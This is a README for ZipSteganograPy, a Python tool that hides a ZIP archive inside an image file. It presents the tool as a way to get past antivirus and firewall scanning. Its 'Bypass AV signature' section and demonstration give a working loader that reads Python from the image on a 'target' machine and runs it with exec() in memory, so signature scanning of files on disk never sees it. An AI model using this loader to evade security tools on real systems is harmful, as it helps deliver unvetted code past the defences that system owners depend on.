![ZipSteganograPy logo](https://mauricelambert.github.io/info/python/security/ZipSteganograPy_small.png "ZipSteganograPy logo")

# ZipSteganograPy

## Description

This tool hides a ZIP archive in an image.

This tool is useful for bypassing antivirus and firewall scanning.

## Requirements

This package require:

 - python3
 - python3 Standard Library

## Installation

```bash
pip install ZipSteganograPy
```

## Usages

```bash
# Hide a ZIP archive in an image:
python3 ZipSteganograPy.py -z archive.zip -o stegano -i image.png
python3 ZipSteganograPy.pyz -z archive.zip -o stegano -i image.jpg

# Create a ZIP archive (with 3 text files) and hide it in an image:
python3 -m ZipSteganograPy -f file1.txt file2.txt file3.txt -i image.jpg
ZipSteganograPy -f file1.txt file2.txt file3.txt -i image.png

# Easily extract the hidden archive using python3 and its standard library:
python3 -m zipfile -l stegano.png            # list files
python3 -m zipfile -e stegano.jpg output/    # extract

# Easily extract the hidden archive using unzip package:
unzip stegano.jpg -l                         # list files
unzip stegano.jpg -d output/                 # extract
```

### Bypass AV signature

This example load a python code from an image and execute it without writing it on the disk.

This method bypass:
[x] basic anti-virus analyze based on signatures of files written on the disk
[ ] behavior module
[ ] process memory analyze

```python
from zipfile import ZipFile
with ZipFile("stegano.png", "r") as f:
    for filename in f.namelist():
        exec(f.read(filename).decode())
```

#### Demonstration

On your computer:

```sh
ZipSteganograPy -f hello.py -i ZipSteganograPy_small.png
# ZipSteganograPy  Copyright (C) 2022  Maurice Lambert
# This program comes with ABSOLUTELY NO WARRANTY.
# This is free software, and you are welcome to redistribute it
# under certain conditions.

# New image 'stegano.png' created from 'ZipSteganograPy_small.png' with hidden ZIP archive.
```

Upload the `stegano.png` file on the target (the zip file will probably not anlyze by firewalls because the file will be detected as a correct image).

On the target (unzip from image and execute your python code without writing it on the disk):

```python
from zipfile import ZipFile
with ZipFile("stegano.png", "r") as f:
    for filename in f.namelist():
        exec(f.read(filename).decode())
```

## Links

 - [Github Page](https://github.com/mauricelambert/ZipSteganograPy/)
 - [Pypi package](https://pypi.org/project/ZipSteganograPy/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/ZipSteganograPy.html)
 - [Python Executable](https://mauricelambert.github.io/info/python/security/ZipSteganograPy.pyz)

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
